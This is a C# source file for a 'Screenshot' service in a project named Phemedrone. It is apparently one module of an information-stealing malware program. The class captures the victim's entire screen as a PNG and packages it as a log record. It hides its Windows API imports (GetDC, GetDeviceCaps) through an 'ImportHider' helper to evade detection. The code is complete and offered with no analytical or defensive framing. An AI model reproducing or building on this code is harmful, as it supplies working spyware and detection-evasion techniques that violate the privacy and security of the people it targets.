using System;
using Phemedrone.Classes;
using Phemedrone.Extensions;
using System.IO;
using System.Drawing;
using System.Drawing.Imaging;
using System.Text;


namespace Phemedrone.Services
{
    public class Screenshot : IService
    {
        private delegate IntPtr GetDC(IntPtr hWnd);
        private delegate int GetDeviceCaps(IntPtr hdc, int nIndex);

        public override PriorityLevel Priority => PriorityLevel.Low;

        protected override LogRecord[] Collect()
        {
            var getDc = ImportHider.HiddenCallResolve<GetDC>("user32.dll", "GetDC");
            var deviceCaps = ImportHider.HiddenCallResolve<GetDeviceCaps>("gdi32.dll", "GetDeviceCaps");

            var screenDc = getDc(IntPtr.Zero);
            var width = deviceCaps(screenDc, 8);
            var height = deviceCaps(screenDc, 10);

            using (var ms = new MemoryStream())
            {
                using (var screen = new Bitmap(width, height))
                {
                    using (var g = Graphics.FromImage(screen))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, screen.Size);
                    }
                    screen.Save(ms, ImageFormat.Png);
                }

                return new[]
                {
                    new LogRecord
                    {
                        Path = "Screenshot.png",
                        Content = ms.ToArray()
                    }
                };
            }
        }
    }
}